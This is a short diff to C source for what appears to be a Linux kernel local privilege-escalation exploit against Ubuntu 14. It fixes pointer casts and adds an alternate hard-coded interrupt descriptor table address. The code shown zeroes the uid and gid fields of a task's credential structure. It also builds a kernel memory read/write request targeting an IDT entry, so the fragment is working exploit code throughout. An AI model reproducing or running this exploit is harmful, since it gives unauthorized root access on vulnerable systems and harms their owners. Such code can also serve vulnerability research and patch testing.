@@ -20,6 +20,7 @@
 
 #if SYSTEM == UBUNTU14_32
 # define IDT_ADDR 0xc1c7b000
+//# define IDT_ADDR 0xc1c84000
 # define THREAD_SIZE 0x2000
 # define TASK_CRED_OFFSET 1020
 #elif SYSTEM == UBUNTU14_64
@@ -50,7 +51,7 @@ struct idt {
 
 void get_root_idt(void *task)
 {
-	int *cred = *((unsigned long *)(task + TASK_CRED_OFFSET));
+	int *cred = (int *) *((unsigned long *)(task + TASK_CRED_OFFSET));
 
         cred[0] = cred[1] = cred[2] = cred[3] = 0; /* set uids */
         cred[4] = cred[5] = cred[6] = cred[7] = 0; /* set gids */
@@ -123,8 +124,8 @@ int main(int argc, char *argv[])
         struct idt idtvec;
 	struct kmem_ioctl mem = {
                 .rw = {
-                        .buf   = &idtvec,
-                        .ppos  = &idt[0xdd],
+                        .buf   = (char *) &idtvec,
+                        .ppos  = (unsigned long) &idt[0xdd],
                         .count = sizeof(struct idt)
                 }
         };
